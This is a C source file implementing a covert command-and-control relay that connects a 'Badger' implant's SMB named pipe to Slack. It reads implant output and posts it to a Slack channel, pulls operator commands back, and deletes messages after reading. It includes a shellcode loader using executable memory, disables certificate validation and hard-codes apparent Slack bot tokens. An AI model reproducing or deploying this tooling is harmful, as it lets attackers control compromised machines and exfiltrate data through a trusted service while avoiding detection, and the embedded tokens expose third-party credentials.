#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include "shellcode.h"

// __attribute__ ((section (".text"))) unsigned char theBlob[] = {
//     0x41,0x42,0x43
// }

struct BADGER_REQUEST_INFO {
    CHAR* server;
    CHAR* useragent;
    CHAR* uri;
    CHAR* postRequest;
    CHAR* headerList[MAX_PATH];
    DWORD port;
    int headerCount;
};

size_t task_strlen(CHAR* buf) {
    size_t i = 0;
    while (buf[i] != '\0') {
        i++;
    }
    return i;
}

void *task_memcpy(void *dest, const void *src, size_t len) {
    char *d = dest;
    const char *s = src;
    while (len--) {
        *d++ = *s++;
    }
    return dest;
}

void *task_memset(void *dest, int val, size_t len) {
    unsigned char *ptr = dest;
    while (len-- > 0) {
        *ptr++ = val;
    }
    return dest;
}

char *task_strstr(char *string, char *substring) {
    register char *a, *b;
    b = substring;
    if (*b == 0) {
    	return string;
    }
    for ( ; *string != 0; string += 1) {
        if (*string != *b) {
            continue;
        }
        a = string;
        while (1) {
            if (*b == 0) {
                return string;
            }
            if (*a++ != *b++) {
                break;
            }
        }
        b = substring;
    }
    return NULL;
}

char *task_search(char* start, char* end, char* string) {
    CHAR* startBuff = task_strstr(string, start);
    if (startBuff) {
        startBuff = startBuff + task_strlen(start);
        CHAR* endBuff = task_strstr(startBuff, end);
        if (endBuff) {
            int buffLength = endBuff - startBuff;
            CHAR* foundString = (CHAR*)calloc(buffLength+1, sizeof(CHAR));
            task_memcpy(foundString, startBuff, buffLength);
            return foundString;
        }
    }
    return NULL;
}

int task_strcmp(const char *p1, const char *p2) {
    const unsigned char *s1 = (const unsigned char *) p1;
    const unsigned char *s2 = (const unsigned char *) p2;
    unsigned char c1, c2;
    do {
        c1 = (unsigned char) *s1++;
        c2 = (unsigned char) *s2++;
        if (c1 == '\0') {
            return c1 - c2;
        }
    }
    while (c1 == c2);
    return c1 - c2;
}

void execShellcode() {
    DWORD lpThreadId = 0;
    DWORD flOldProtect;
    LPVOID shellcodeAlloc = VirtualAlloc(NULL, badger_x64_smb_bin_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    task_memcpy(shellcodeAlloc, badger_x64_smb_bin, badger_x64_smb_bin_len);
    VirtualProtect(shellcodeAlloc, badger_x64_smb_bin_len, PAGE_EXECUTE_READ, &flOldProtect);
    CreateThread(NULL, 1024*1024, (LPTHREAD_START_ROUTINE)shellcodeAlloc, NULL, 0, &lpThreadId);
    VirtualFree(shellcodeAlloc, 0, MEM_RELEASE);
    Sleep(1000); // good to wait for a second before returning as the shellcode might take 200-500ms to start the named pipe
}

HANDLE connectSMB(CHAR* smbPipeName) {
	DWORD dwMode = PIPE_READMODE_BYTE | PIPE_WAIT;
    HANDLE badgerNamedPipe = CreateFileA(smbPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
    if (badgerNamedPipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }
	if (! SetNamedPipeHandleState(badgerNamedPipe, &dwMode, NULL, NULL)) {
        CloseHandle(badgerNamedPipe);
        return NULL;
	}
    return badgerNamedPipe;
}

BOOL checkSuccess(CHAR* message) {
    CHAR* isValid = task_search("\"ok\":true", ",", message);                // check if the request was successful
    if (isValid) {
        free(isValid);
        return TRUE;
    }
    return FALSE;
}

CHAR* httpConnect(struct BADGER_REQUEST_INFO bgrReqInfo) {
    // sends either GET or POST request to slack.com
    HINTERNET b_Internet = NULL, b_HttpSession = NULL, b_HttpRequest = NULL;
    DWORD SecFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    CHAR* response = NULL;
    BOOL httpSuccess = FALSE;

    if (b_Internet = InternetOpenA(bgrReqInfo.useragent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0)) {
        if ((b_HttpSession = InternetConnectA(b_Internet, bgrReqInfo.server, 443, 0, 0, INTERNET_SERVICE_HTTP, 0, 0))) {
            if (bgrReqInfo.postRequest) {
                b_HttpRequest = HttpOpenRequestA(b_HttpSession, "POST", bgrReqInfo.uri, 0, 0, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_COOKIES, 0);
            } else {
                b_HttpRequest = HttpOpenRequestA(b_HttpSession, "GET", bgrReqInfo.uri, 0, 0, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_COOKIES, 0);
            }
            if (b_HttpRequest) {
                if (InternetSetOptionA(b_HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &SecFlag, sizeof(SecFlag))) {
                    for (int i = 0; i < bgrReqInfo.headerCount; i++) {
                        HttpAddRequestHeadersA(b_HttpRequest, bgrReqInfo.headerList[i], -1, HTTP_ADDREQ_FLAG_ADD);
                    } 
                    if (bgrReqInfo.postRequest) {
                        httpSuccess = HttpSendRequestA(b_HttpRequest, 0, 0, bgrReqInfo.postRequest, task_strlen(bgrReqInfo.postRequest));
                    } else {
                        httpSuccess = HttpSendRequestA(b_HttpRequest, 0, 0, NULL, 0);
                    }
                    if (httpSuccess) {
                        DWORD offset = 0;
                        while (TRUE) {
                            DWORD availabledSize = 0, buff_downloaded;
                            BOOL checkVal = InternetQueryDataAvailable(b_HttpRequest, &availabledSize, 0, 0);
                            if (!checkVal || availabledSize == 0)  {
                                break;
                            }

                            CHAR* tempbuff = (CHAR*)calloc(availabledSize+1, sizeof(CHAR));
                            checkVal = InternetReadFile(b_HttpRequest, tempbuff, availabledSize, &buff_downloaded);
                            if (!checkVal || buff_downloaded == 0) {
                                free(tempbuff);
                                break;
                            }
                            DWORD newSizeOfBuff = offset + buff_downloaded + 1;         // old + new = new size of buffer
                            response = (CHAR*)realloc(response, newSizeOfBuff);
                            task_memcpy(response+offset, tempbuff, buff_downloaded);
                            free(tempbuff);
                            tempbuff = NULL;
                            offset = offset + buff_downloaded;                          // old + new = new size of buffer
                            response[offset] = 0;
                        }
                    }
                }
                InternetCloseHandle(b_HttpRequest);
            }
            InternetCloseHandle(b_HttpSession);
        }
        InternetCloseHandle(b_Internet);
    }
    return response;
}

CHAR* listenerAppPostMessage(CHAR* buffer, CHAR* thread_ts) {
    struct BADGER_REQUEST_INFO bgrReqInfo = { 0 };
    bgrReqInfo.server = "slack.com";
    bgrReqInfo.useragent = "Mozilla";                                                                                   // Use a valid useragent
    bgrReqInfo.uri = "/api/chat.postMessage";                                                                           // Slack URI to send a message
    bgrReqInfo.port = 443;
    bgrReqInfo.headerList[0] = "Authorization: Bearer xoxb-2144924547920-3382587054001-2xPrUBj0D8yf0D5BNDPh3nwY\r\n";   // change the token to your Listener Channel's token
    bgrReqInfo.headerList[1] = "Content-Type: application/json\r\n";
    bgrReqInfo.headerCount = 2;

    CHAR* postMsgStart = "{\"channel\": \"D03AFAZC6B1\", \"text\": \"";                                                 // change the channel name (D03AFAZC6B1) to your Listener Channel
    CHAR* postMsgEnd = "\"}";
    CHAR* msgThreadTs = "\",\"thread_ts\":\"";                                                                          // this is used for sending replies to messages in case the buffer is > 4000 (Slack limites a max msg buffer to 4000 chars)
    CHAR* finalPostMsg = NULL;

    // building the json message
    if (thread_ts) {                                                                                                    // if thread_ts, send a reply in the thread instead of a new message
        int finalssagesg = task_strlen(postMsgStart) + task_strlen(buffer) + task_strlen(msgThreadTs) + task_strlen(thread_ts) + task_strlen(postMsgEnd);
        finalPostMsg = (CHAR*) calloc(finalssagesg+1, sizeof(CHAR));
        sprintf_s(finalPostMsg, finalssagesg+1, "%s%s%s%s%s", postMsgStart, buffer, msgThreadTs, thread_ts, postMsgEnd);
    } else {                                                                                                            // if !thread_ts, send a new message
        int finalssagesg = task_strlen(postMsgStart) + task_strlen(buffer) + task_strlen(postMsgEnd);
        finalPostMsg = (CHAR*) calloc(finalssagesg+1, sizeof(CHAR));
        sprintf_s(finalPostMsg, finalssagesg+1, "%s%s%s", postMsgStart, buffer, postMsgEnd);
    }

    bgrReqInfo.postRequest = finalPostMsg;
    CHAR *response =  httpConnect(bgrReqInfo);
    free(finalPostMsg);
    return response;
}

CHAR* extractFullCommandFromReply(struct BADGER_REQUEST_INFO bgrReqInfo, CHAR* timeStamp) {
    printf("[DEBUG] Requesting full thread\n");
    CHAR* response = NULL;
    CHAR* recvCommand = NULL;
    CHAR* bgrCmd = NULL;
    CHAR* slackURI = NULL;
    CHAR* threadMessageStart = "start$";
    CHAR* threadMessageEnd = "$end";
    CHAR* cmdDelimiterStart = "\"text\":\"<@U039KRC46BS> ";                                                                         // Add your BadgerApp Channel's User ID - used for command extraction
    CHAR* replyURI = "/api/conversations.replies?channel=D03AT6A4X9T&ts=";                                                                     // change the channel name (D03AT6A4X9T) to your BadgerApp Channel
    int slackURILen = task_strlen(replyURI) + task_strlen(timeStamp);
    slackURI = (CHAR*) calloc(slackURILen+1, sizeof(CHAR));
    sprintf_s(slackURI, slackURILen+1, "%s%s", replyURI, timeStamp);
    bgrReqInfo.uri = slackURI;

    // Ratel server sends the responses in chunks of around 4000 bytes or less to the BadgerApp
    // If we send a request while the chunks are still being uploaded, we might get only partial messages
    // So, we will check if the replies contain threadMessageEnd, if it does, it means all replies are posted
    while (TRUE) {
        response = httpConnect(bgrReqInfo);
        CHAR* isComplete = task_strstr(response, threadMessageEnd);
        if (isComplete) {
            printf("\n");
            break;
        }
        printf(".");
        free(response);
        response = NULL;
        Sleep(2000); // cannot send more than 2 message per second - slack limitations
    }
    // printf("\n[DEBUG] response: %s\n", response);

    CHAR* searchOffset = task_strstr(response, cmdDelimiterStart);                             // this returns everything from the first '"text":"<@U039KRC46BS> ' to the end of the buffer
    recvCommand = task_search(threadMessageStart, "\"", searchOffset);                         // this returns the first value between 'start$...."' to get the part buffer of the command
    DWORD i = 0;
    // printf("[DEBUG] task_strlen(recvCommand): %lu\n", task_strlen(recvCommand));
    // printf("[DEBUG] recvCommand: %s\n", recvCommand);
    while (TRUE) {
        i++;
        searchOffset = searchOffset + task_strlen(cmdDelimiterStart);                          // get the offset to where 'start$' starts, so that we can use this to search for the next '"text":"<@U039KRC46BS> ' in memory
        searchOffset = task_strstr(searchOffset, cmdDelimiterStart);                           // use the first search offset to further search the next offset
        if (! searchOffset) {
            break;
        }
        CHAR* partBuffer = task_search(threadMessageStart, "\"", searchOffset);                // use the next search offset to further search more parts of the buffer
        if (!partBuffer) {
            break;
        }
        printf("[DEBUG] task_strlen(recvCommand): %lu\n", task_strlen(recvCommand));
        printf("[DEBUG] task_strlen(partBuffer): %lu\n", task_strlen(partBuffer));
        // printf("[DEBUG] partBuffer: %s\n", partBuffer);
        DWORD newBufSize = task_strlen(recvCommand) + task_strlen(partBuffer);
        DWORD copyOffsetForNewBuffer = task_strlen(recvCommand);
        recvCommand = (CHAR*)realloc(recvCommand, newBufSize+1);
        task_memcpy(recvCommand+copyOffsetForNewBuffer, partBuffer, task_strlen(partBuffer));
        recvCommand[newBufSize] = 0;
        free(partBuffer);
    }
    printf("[DEBUG] Chunk count: %lu\n", i);

    if (recvCommand) {
        DWORD bgrCmdLen = task_strlen(recvCommand);
        bgrCmd = (CHAR*)calloc(bgrCmdLen+1, sizeof(CHAR));
        for (int i = 0, j = 0; i< bgrCmdLen; i++) {
            if (recvCommand[i] != '\\') {                                                                                       //fix added to remove json escaping slashes
                bgrCmd[j] = recvCommand[i];
                j++;
            }
        }
    }

    DWORD bgrCmdLen = task_strlen(bgrCmd);
    printf("[DEBUG] bgrCmdLen: %lu\n", bgrCmdLen);
    getchar();

    free(slackURI);
    free(response);
    free(recvCommand);
    return bgrCmd;
}

CHAR* badgerAppReceiveMessage() {
    CHAR* deleteURI = "/api/chat.delete?channel=D03AT6A4X9T&ts=";                                                                     // change the channel name (D03AT6A4X9T) to your BadgerApp Channel
    CHAR* slackBadgerAppToken = "Authorization: Bearer xoxb-2144924547920-3393858142400-qEIcN8hBt0WgwRaJImILqMAj\r\n";    // change the channel token to your BadgerApp Channel token
    CHAR* cmdDelimiterStart = "\"text\":\"<@U039KRC46BS> ";                                                                         // Add your BadgerApp Channel's User ID - used for command extraction
    CHAR* tsDelimiterStart = "\"ts\":\"";
    CHAR* msgDelimiterEmd = "\"";

    CHAR* slackURI = NULL;
    CHAR* response = NULL;
    CHAR* bgrCmd = NULL;
    CHAR* timeStamp = NULL;

    struct BADGER_REQUEST_INFO bgrReqInfo = { 0 };
    bgrReqInfo.server = "slack.com";
    bgrReqInfo.useragent = "Mozilla";                                                                                               // Use a valid useragent
    bgrReqInfo.uri = "/api/conversations.history?limit=1&channel=D03AT6A4X9T";                                                      // enumerate messages - change the channel name (D03AT6A4X9T) to your BadgerApp Channel
    bgrReqInfo.port = 443;
    bgrReqInfo.headerList[0] = slackBadgerAppToken;
    bgrReqInfo.headerCount = 1;
    bgrReqInfo.postRequest = NULL;                                                                                                  // if the message is a GET request, set the POST to NULL

    response = httpConnect(bgrReqInfo);
    if (response) {
        // first check if the response contains any replies. If it does, we have to send a http request again to fetch all the replies and concatenate it
        CHAR* checkReply = task_strstr(response, "reply_count");                                                                  // start extracting the command from json response
        // IF reply_count exists, we might need to check in a for loop every few seconds to see if reply count increases. We don't want to read up partial messages while the slack app is getting updated by the AdaptiveC2
        if (checkReply) {
            CHAR* replyTimeStamp = task_search(tsDelimiterStart, msgDelimiterEmd, response);                            // extract the timestamp to search the thread
            if (replyTimeStamp) {
                bgrCmd = extractFullCommandFromReply(bgrReqInfo, replyTimeStamp);
                free(replyTimeStamp);
            }
        } else {
            CHAR* cmdStart = task_strstr(response, cmdDelimiterStart);                                                                  // start extracting the command from json response
            if (cmdStart) {
                cmdStart = cmdStart + task_strlen(cmdDelimiterStart);
                CHAR* cmdEnd = task_strstr(cmdStart, msgDelimiterEmd);
                if (cmdEnd) {
                    int bgrCmdLen = cmdEnd - cmdStart;
                    bgrCmd = (CHAR*)calloc(bgrCmdLen+1, sizeof(CHAR));
                    for (int i = 0, j = 0; i< bgrCmdLen; i++) {
                        if (cmdStart[i] != '\\') {                                                                                       //fix added to remove json escaping slashes
                            bgrCmd[j] = cmdStart[i];
                            j++;
                        }
                    }
                    // printf("[DEBUG] BRc4 Command: '%s'\n", bgrCmd);
                }
            }
        }
        // else no commands received. Now search timestamp in the response and delete the message from the server using the timestamp
        timeStamp = task_search(tsDelimiterStart, msgDelimiterEmd, response);
        if (timeStamp) {
            // only part of the struct (URI) is updated, coz the rest of the objects in the struct are the same
            int slackURILen = task_strlen(deleteURI) + task_strlen(timeStamp);
            slackURI = (CHAR*) calloc(slackURILen+1, sizeof(CHAR));
            sprintf_s(slackURI, slackURILen+1, "%s%s", deleteURI, timeStamp);
            bgrReqInfo.uri = slackURI;
            httpConnect(bgrReqInfo);
        }
    }

    free(slackURI);
    free(response);
    free(timeStamp);
    return bgrCmd;
}

CHAR* readFromPipe(HANDLE badgerNamedPipe) {
    CHAR* pipeBuffer = NULL;
    CHAR *recvbuf = (CHAR*)calloc(65535+1, sizeof(CHAR));
    DWORD offset = 0;
    while (TRUE) {
        DWORD retVal = 0, bytesRead = 0;
        retVal = ReadFile(badgerNamedPipe, recvbuf, 65535, &bytesRead, NULL);           // SMB Can read a maximum of 65535 bytes. So loop untill all buffer is received
        if (!retVal || bytesRead == 0) {
            if (GetLastError() != ERROR_MORE_DATA) {
                ExitProcess(0);                                                         // Error from pipe
            }
        }
        DWORD newSizeOfBuff = offset + bytesRead + 1;                                   // old (offset) + new (bytesread) = new size of buffer
        pipeBuffer = (CHAR*)realloc(pipeBuffer, newSizeOfBuff);
        task_memcpy(pipeBuffer+offset, recvbuf, bytesRead);
        offset = offset + bytesRead;                                                    // old (offset) + new (bytesread) = new size of buffer
        pipeBuffer[offset] = 0;                                                         // Add null byte
        task_memset(recvbuf, 0, 65535+1);
        if (bytesRead < 65535) {
            break;
        }
    }
    free(recvbuf);
    return pipeBuffer;
}

BOOL getServerToken(HANDLE badgerNamedPipe) {
    BOOL retVal = FALSE;
    CHAR* lresponse = NULL;
    CHAR* pipeBuffer = readFromPipe(badgerNamedPipe);                                               // receive the badger's encrypted token
    if (pipeBuffer) {
        lresponse = listenerAppPostMessage(pipeBuffer, NULL);
        if (lresponse && checkSuccess(lresponse)) {                                                 // check if the request was successful
            while (TRUE) {                                                                          // Loop until connected to slack
                CHAR* bgrCmd = badgerAppReceiveMessage();                                        // badger's encrypted token
                if (bgrCmd) {
                    DWORD bgrCmdLen = task_strlen(bgrCmd);
                    DWORD bytesWritten = 0;
                    retVal = WriteFile(badgerNamedPipe, bgrCmd, bgrCmdLen, &bytesWritten, NULL);
                    if (retVal && bgrCmdLen == bytesWritten) {
                        retVal = TRUE;
                    }
                    free(bgrCmd);
                    break;
                }
            }
        }
    }
    free(lresponse);
    free(pipeBuffer);
    return retVal;
}

VOID slackConnectMain(HANDLE badgerNamedPipe) {
    // used as an identifier to distinguish threaded messages from full messages sent to the server as the maximum slack rate limit is 4000 chars per message
    // thread messages are stored in an array on the adaptive server, till all threads are recieved
    // add your own custom seperator, but make changes to the python3 script too
    CHAR* threadMessageStart = "start$";
    CHAR* threadMessageEnd = "$end";
    while (TRUE) {
        CHAR* response = NULL;
        CHAR* pipeBuffer = readFromPipe(badgerNamedPipe);
        if (pipeBuffer) {
            DWORD pipeBufferLength = task_strlen(pipeBuffer);
            printf("[DEBUG] Sending %lu bytes\n", pipeBufferLength);
            if (pipeBufferLength > 4000) {                                                              // 4000 is the maximum limit of slack messages
                CHAR* thread_ts = NULL;
                CHAR sendBuffer[4000] = { 0 };                                                          // temporary buffer to hold the firs 3950 bytes, remaining bytes are for custom threadSeperator (threadMessageStart)
                for (int i = 0, j = 0; i < pipeBufferLength; i++, j++) {
                    if (j == 3950) {                                                                    // create a buffer for 3950 buffer + 5 bytes of partmessage seperator
                        CHAR finalBuffer[4000] = { 0 };                                                 // total message cannot be more than 4000 bytes
                        sprintf_s(finalBuffer, 4000, "%s%s", threadMessageStart, sendBuffer);           // append the threadMessageStart
                        if (thread_ts) {
                            response = listenerAppPostMessage(finalBuffer, thread_ts);                  // if thread_ts is NULL, NULL will be sent, else the thread timestamp
                        } else {
                            response = listenerAppPostMessage(finalBuffer, NULL);
                            if (response) {
                                thread_ts = task_search("\"ts\":\"", "\"", response);                   // search the timestamp of the main message since part messages will be sent as replies to the main message
                                free(response);
                                response = NULL;
                            }
                        }
                        Sleep(1000);                                                                    // slack rate limit to send message replies - 1 message per second
                        task_memset(sendBuffer, 0, sizeof(sendBuffer));
                        j = 0;
                    }
                    sendBuffer[j] = pipeBuffer[i];
                }
                if (task_strlen(sendBuffer) > 0) {                                                      // if any partial message is left to be sent, send it
                    if (task_strcmp(sendBuffer, threadMessageStart) != 0) {                             // validate the response is not just the seperator
                        CHAR finalBuffer[4000] = { 0 };                                                 // total message cannot be more than 4000 bytes
                        sprintf_s(finalBuffer, 4000, "%s%s", threadMessageStart, sendBuffer);           // append the threadMessageStart
                        response = listenerAppPostMessage(finalBuffer, thread_ts);                      // if thread_ts is NULL, NULL will be sent, else the thread timestamp. Receive the response 
                    }
                }
                // send the threaded message end response
                response = listenerAppPostMessage(threadMessageEnd, thread_ts);                         // send the final buffer (threadMessageEnd) to specify that the thread is complete
                free(thread_ts);
            } else {
                response = listenerAppPostMessage(pipeBuffer, NULL);                                    // Receive the response for a message that was sent in full
            }

            if (response) {
                DWORD bytesWritten = 0;
                CHAR* bgrCmd = badgerAppReceiveMessage();                                                      // Get the next command in queue
                if (bgrCmd) {
                    DWORD bgrCmdLen = task_strlen(bgrCmd);
                    printf("[DEBUG] Sending Command of %lu bytes\n", bgrCmdLen);
                    if (bgrCmdLen == 0) {                                                               // if command is empty, send 1 empty byte to the SMB Pipe
                        bgrCmdLen = 1;
                        printf("[DEBUG] No Commands Received. Sending 1 empty byte\n");
                        DWORD retVal = WriteFile(badgerNamedPipe, "", 1, &bytesWritten, NULL);
                        if (!retVal || bgrCmdLen != bytesWritten) {
                            free(bgrCmd);
                            ExitProcess(0);
                        }
                    } else {
                        DWORD retVal = WriteFile(badgerNamedPipe, bgrCmd, bgrCmdLen, &bytesWritten, NULL);
                        if (!retVal || bgrCmdLen != bytesWritten) {
                            free(bgrCmd);
                            ExitProcess(0);
                        }
                    }
                    free(bgrCmd);
                } else {
                    printf("[DEBUG] No Commands Received. Sending 1 empty byte\n");
                    if (! (WriteFile(badgerNamedPipe, "", 1, &bytesWritten, NULL)) ) {                  // if command is empty, send 1 empty byte to the SMB Pipe
                        ExitProcess(0);
                    }
                }
            } else {
                printf("[DEBUG] Unable to connect to slack\n");
                ExitProcess(0);
            }
        }
        free(response);
        free(pipeBuffer);
        Sleep(2000);                                        // cannot have Sleep 0 as Slack has rate limits of 1 message per seconds - https://api.slack.com/docs/rate-limits
    }
}

int main() {
    // execShellcode();                                     // Uncomment this if badger's SMB shellcode is be executed within this process
    CHAR* smbPipeName = "\\\\.\\pipe\\mynamedpipe";         // named pipe for your SMB Badger
    HANDLE badgerNamedPipe = connectSMB(smbPipeName);
    if (! badgerNamedPipe) {
        return 0;
    }
    if (getServerToken(badgerNamedPipe)) {                  // Send initial badger request and receive the authentication token from the ratel server
        slackConnectMain(badgerNamedPipe);                 // Connect to the server for incoming commands
    }

    return 0;
}